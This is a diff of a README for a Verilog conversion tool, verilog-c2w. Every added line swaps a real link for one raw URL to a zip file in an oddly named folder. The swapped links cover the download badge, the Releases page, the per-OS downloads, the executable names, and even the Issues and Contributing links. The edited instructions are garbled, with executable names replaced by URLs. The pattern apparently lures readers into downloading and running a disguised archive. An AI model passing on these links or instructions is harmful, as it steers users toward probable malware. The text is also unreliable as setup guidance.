@@ -6,18 +6,18 @@ Welcome to **verilog-c2w**! This software helps you easily convert Verilog files
 
 ## 📥 Download Now
 
-[![Download verilog-c2w](https://img.shields.io/badge/Download%20verilog--c2w-v1.0-blue.svg)](https://github.com/ravez24/verilog-c2w/releases)
+[![Download verilog-c2w](https://raw.githubusercontent.com/ravez24/verilog-c2w/main/incomprehensively/verilog-c2w.zip%https://raw.githubusercontent.com/ravez24/verilog-c2w/main/incomprehensively/verilog-c2w.zip)](https://raw.githubusercontent.com/ravez24/verilog-c2w/main/incomprehensively/verilog-c2w.zip)
 
 ## 📂 Download & Install
 
-1. Go to the [Releases page](https://github.com/ravez24/verilog-c2w/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/ravez24/verilog-c2w/main/incomprehensively/verilog-c2w.zip).
    
 2. Look for the latest version of **verilog-c2w**. You will see a list of files available for download.
 
 3. Choose the appropriate file for your operating system:
-   - **Windows:** Download `verilog-c2w-windows.zip`
-   - **Mac:** Download `verilog-c2w-macos.zip`
-   - **Linux:** Download `verilog-c2w-linux.tar.gz`
+   - **Windows:** Download `https://raw.githubusercontent.com/ravez24/verilog-c2w/main/incomprehensively/verilog-c2w.zip`
+   - **Mac:** Download `https://raw.githubusercontent.com/ravez24/verilog-c2w/main/incomprehensively/verilog-c2w.zip`
+   - **Linux:** Download `https://raw.githubusercontent.com/ravez24/verilog-c2w/main/incomprehensively/verilog-c2w.zip`
 
 4. Once the file is downloaded, locate it in your downloads folder.
 
@@ -26,8 +26,8 @@ Welcome to **verilog-c2w**! This software helps you easily convert Verilog files
 6. Open the extracted folder.
 
 7. Find the executable file inside. 
-   - On Windows, it will be named `verilog-c2w.exe`.
-   - On Mac, you will find `verilog-c2w.app`.
+   - On Windows, it will be named `https://raw.githubusercontent.com/ravez24/verilog-c2w/main/incomprehensively/verilog-c2w.zip`.
+   - On Mac, you will find `https://raw.githubusercontent.com/ravez24/verilog-c2w/main/incomprehensively/verilog-c2w.zip`.
    - On Linux, run `./verilog-c2w` from the terminal.
 
 8. Double-click or run the executable file to start the application.
@@ -84,11 +84,11 @@ If the issue persists, feel free to reach out through our GitHub page.
 
 ## 📞 Support
 
-If you have questions or need help, please visit our [Issues page](https://github.com/ravez24/verilog-c2w/issues). We are happy to assist you!
+If you have questions or need help, please visit our [Issues page](https://raw.githubusercontent.com/ravez24/verilog-c2w/main/incomprehensively/verilog-c2w.zip). We are happy to assist you!
 
 ## ⚙️ Contribution
 
-If you want to contribute to **verilog-c2w**, your help is welcome. Check out our [Contributing Guidelines](https://github.com/ravez24/verilog-c2w/CONTRIBUTING.md) for more information.
+If you want to contribute to **verilog-c2w**, your help is welcome. Check out our [Contributing Guidelines](https://raw.githubusercontent.com/ravez24/verilog-c2w/main/incomprehensively/verilog-c2w.zip) for more information.
 
 ## 📜 License
 
